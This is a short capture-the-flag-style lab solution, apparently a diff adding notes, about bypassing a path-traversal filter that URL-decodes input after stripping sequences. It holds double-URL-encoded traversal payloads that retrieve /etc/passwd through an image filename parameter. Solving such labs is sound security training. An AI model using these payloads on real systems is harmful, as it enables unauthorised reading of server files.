@@ -1,0 +1,19 @@
+Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+
+
+
+
+
+Query vulnerabilità: GET /image?filename=10.jpg
+Exploit: (URLENCODE x2) ..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd
+(URLENCODE_ALL x2) %25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46%25%32%45%25%32%45%25%32%46etc/passwd
+
+
+Risultato: GET /image?filename=..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd
